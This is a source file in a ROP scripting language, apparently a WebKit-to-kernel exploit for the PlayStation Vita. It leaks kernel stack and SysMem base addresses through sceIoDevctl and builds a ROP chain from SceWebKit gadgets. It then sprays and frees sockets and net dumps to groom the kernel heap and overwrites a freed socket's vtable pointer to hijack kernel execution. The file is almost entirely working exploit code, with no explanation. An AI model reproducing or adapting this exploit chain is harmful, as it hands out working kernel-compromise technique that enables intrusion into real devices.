#include "common.rop"

data
{
	#include "functions.rop"

	buffer ioctl[0x400];
	buffer crap[0x100];
	buffer our_data[0x404];
	variable file_uid = -1;
	variable kernel_stack_base = -1;
	variable sysmem_base;

	<% need_sockets = 80 %>
	symbol need_sockets = <%= need_sockets %>;
	buffer sockets[<%= need_sockets * 4 %>];
	variable free1;
	variable tester;
	variable tmp;
	variable dump_to_free;
	variable another_hole;
	<% need_dumps = 9 %>
	buffer dumps_to_delete[<%= need_dumps * 4 %>];

	variable rop_thread_id; // thread calling vulnerable syscall
	buffer thread_info[0x80];
	symbol stack_size = 0x2000;
	variable stack_base;
	buffer user_ropchain[0x100];
	variable pret;
	buffer ldm_buf[7 * 4];
	buffer mybuf[0x100];
	variable vptr;
}

code : entry
{
	PRINTF("started\n");
	strcat(our_data, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B");


	strcat(crap, "xmc-lp-ign-userext");
	strcat(crap+0x20, "sdstor0:");
	memset(ioctl, 0, 0x400);
	// sceKernelCreateThread("iwantsysmem", infinite_loop, 0, 0,0,0,0);
	sceIoOpen("molecule0:", 0, 0);
	sceIoDevctl(crap+0x20, 5, crap, 0x14, ioctl, 0x3FF);
	PRINTF("%x\n", &return);

#if 0
	sceIoOpen("host0:stack.bin", 0x602, 6);
	store(&return, file_uid);
	PRINTF("%x\n", [file_uid]);
	sceIoWrite([file_uid], ioctl, 0x400);
	sceIoClose([file_uid]);
#endif

	add([ioctl+0x3C4], -0xABC);
	store(&return, kernel_stack_base);
	add([ioctl+0x3D4], -0x5747);
	store(&return, sysmem_base);
	PRINTF("kernel stack: 0x%x (?)\n", [kernel_stack_base]);
	PRINTF("sysmem base: 0x%x \n", [sysmem_base]);

	// plant our data
	sceIoDevctl(crap+0x20, 5, our_data, 0x400, 0, 0);
	// PRINTF("devctl 0x%x   \n", &return);

	// trigger rootkit
	// sceIoClose(0xb00b5);

	// set up overwritten socket structure
	add([sysmem_base], 0x25eb8); // 0x25ED4 - 28);
	store(&return, vptr);
	PRINTF("got offset 0x%x\n", [vptr]);
	store([vptr], mybuf + 0x18); // vptr

	// create and set up rop thread that will call vulnerable syscall
	sceKernelCreateThread("mhm", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
	store(&return, rop_thread_id);
	PRINTF("thread %x \n", [rop_thread_id]);
	store(0x7C, thread_info);
	sceKernelGetThreadInfo([rop_thread_id], thread_info);
	PRINTF("stack %x  \n", [thread_info + 0x34]);
	// some free space for function calls
	add([thread_info + 0x34], 0x1000);
	store(&return, stack_base);

	// create a lot of sockets
	<% need_sockets.times do |socket_id| %>
	socket("x", 2, 1, 0);
	store(&return, sockets + 4 * <%= socket_id %>);
	PRINTF("socket %d \n", [sockets + 4 * <%= socket_id %>]);
	<% end %>

	PRINTF("enough of this\n");

	socket("sss", 2, 1, 0);
	store(&return, free1);
	
	socket("tst", 2, 7, 0);
	store(&return, tester);
	
	PRINTF("tester socket %d\n", [tester]);

	// build user ropchain
	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + 0 * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store([tester], user_ropchain + 1 * 4); // r0
	store(0x10007300, user_ropchain + 2 * 4); // r1
	store(0, user_ropchain + 3 * 4); // r2
	store(0, user_ropchain + 4 * 4); // r3
	store(sceNetSyscallIoctl, user_ropchain + 5 * 4); // r4
	store(0, user_ropchain + 6 * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + 7 * 4); // blx r4 ; pop {r4, pc}
	store(pret, user_ropchain + 8 * 4); // r4
	store(ASLR::SceWebKit + 0x59a9, user_ropchain + 9 * 4); // 0x000059a8 : str r0, [r4] ; pop {r4, pc}
	store(0, user_ropchain + 10 * 4); // r4
	store(infinite_loop, user_ropchain + 11 * 4); // pc
	// copy user ropchain into user stack
	memcpy([stack_base], user_ropchain, 0x100);
	// set up args for LDM user thread stack pivot
	store([stack_base], ldm_buf+5*4);
	store(pop_pc, ldm_buf+6*4);
	
	socket("tmp", 2, 1, 0);
	store(&return, tmp);

	<% need_dumps.times do |dump_id| %>
	sceNetDumpCreate("ddd", 0xF00, 0);
	store(&return, dumps_to_delete + <%= 4 * dump_id %>);
	<% end %>

	sceNetDumpCreate("ddd", 0xF00, 0);
	store(&return, another_hole);
	
	sceNetDumpCreate("ddd", 0x1000, 0);
	store(&return, dump_to_free);
	
	PRINTF("dump_to_free: 0x%08X\n", [dump_to_free]);	

	PRINTF("now free some stuffs and create holes...  \n");

	// free some memory and create holes
	<% (0..need_dumps-1).step(2) do |dump_id| %>
	sceNetDumpDestroy([dumps_to_delete + <%= 4 * dump_id %>]);
	<% end %>

	sceNetDumpDestroy([another_hole]);

	sceNetDumpCreate("ddd", 0xD0000, 0);
	PRINTF("create large 0xD0000 0x%x\n", &return);

	sceNetDumpCreate("ddd", 0x1000, 0);
	PRINTF("another 0x%x\n", &return);

/*
	<% (0x1000).step(0x100, -0x100) do |dump_sz| %>
	sceNetDumpCreate("ddd", <%= dump_sz %>, 0);
	PRINTF("try size 0x<%= dump_sz.to_s(16) %> get 0x%x   \n", &return);
	<% end %>
*/

	sceNetDumpCreate("ddd", 0x1000, 0);
	PRINTF("last dump size=0x1000 ret=0x%x (should be=0x8041010c) \n", &return);

	sceKernelStartThread([rop_thread_id], 7 * 4, ldm_buf); // it should hang
	PRINTF("start user rop thread 0x%x\n", &return);

	sceKernelDelayThread(1*1000*1000);
	// free sockets
	<% (0..need_sockets-1).step(2) do |socket_id| %>
	sceNetSyscallClose([sockets + <%= 4 * socket_id %>]);
	PRINTF("close ret 0x%x\n", &return);
	<% end %>

	sceNetSyscallClose([tester]);
	PRINTF("free tester 0x%x\n", &return);
	sceNetSyscallControl(0, 0x30000000, mybuf, 0xFC);
	sceNetDumpDestroy([dump_to_free]);

	sceKernelDelayThread(1*1000*1000);
	PRINTF("user thread reports %d\n", [pret]);

	add([pret], 1052); // => should be zero now
	add(&return, infloop);  // => crash on fail infloop on success
	call_r0(0);

	infloop();
}
